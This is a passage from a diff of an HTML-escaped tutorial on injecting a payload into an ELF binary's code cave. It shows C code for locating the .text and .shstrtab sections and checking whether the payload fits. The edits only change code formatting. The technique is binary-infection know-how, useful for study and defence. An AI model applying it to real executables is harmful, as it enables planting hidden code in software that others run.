 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;section .text
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    global _start
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
@@ -630,7 +624,7 @@ Then we keep looking for segments with type &lt;code&gt;PT_LOAD&lt;/code&gt; and
 &lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: We placed a placeholder there (&lt;code&gt;0x1111111111111111&lt;/code&gt;), so we can modify it from the injector script later.&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;h3 id=&#34;retrieving-the-payload&#34;&gt;Retrieving the payload&lt;/h3&gt;
-&lt;p&gt;In order to retrieve the payload, we first need to find the .text section where the code resides. This is done via the &lt;code&gt;find_section&lt;/code&gt; function that takes as arguments a pointer to the start of the file and the section we want to search for.&lt;/p&gt;
+&lt;p&gt;In order to retrieve the payload, we first need to find the &lt;code&gt;.text&lt;/code&gt; section where the code resides. This is done via the &lt;code&gt;find_section&lt;/code&gt; function that takes as arguments a pointer to the start of the file and the section we want to search for.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p_txt_sec_ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; find_section(data1, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.text&amp;#34;&lt;/span&gt;);
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The function gets the elf header using the pointer passed as the first argument and then calculates the start of the Section Program Header. Thus we get a pointer to it.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Elf64_Shdr&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;find_section&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;ptr_elf, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;query) {
@@ -667,7 +661,7 @@ Then we keep looking for segments with type &lt;code&gt;PT_LOAD&lt;/code&gt; and
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In order to get the section names we need to access the String Header Section Table (&lt;code&gt;.shstrtab&lt;/code&gt;) in the ELF file. That table stores all the section names required for the executable. Now that we clarified that, we can move on and see what the next part of the code does. So, we get a pointer to the .shstrtab by adding the specific offset to the beginning of the file. Then, we iterate over all the sections in the ELF file and retrieve the name of the section by adding to the &lt;code&gt;sec_strtab_ptr&lt;/code&gt; the index where the name resides.&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In order to get the section names we need to access the String Header Section Table (&lt;code&gt;.shstrtab&lt;/code&gt;) in the ELF file. That table stores all the section names required for the executable. Now that we clarified that, we can move on and see what the next part of the code does. So, we get a pointer to the &lt;code&gt;.shstrtab&lt;/code&gt; by adding the specific offset to the beginning of the file. Then, we iterate over all the sections in the ELF file and retrieve the name of the section by adding to the &lt;code&gt;sec_strtab_ptr&lt;/code&gt; the index where the name resides.&lt;/p&gt;
 &lt;h3 id=&#34;processing-the-payload&#34;&gt;Processing The Payload&lt;/h3&gt;
 &lt;p&gt;After we know where the &lt;code&gt;.text&lt;/code&gt; section of the payload is, we can check to see if the payload fits into the padding found earlier. Then copy the payload code at the end of the &lt;code&gt;.text&lt;/code&gt; section in the target file, using the offset returned by the &lt;code&gt;find_codecave&lt;/code&gt; function.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// If the payload is to big to fit in the codecave, exit.
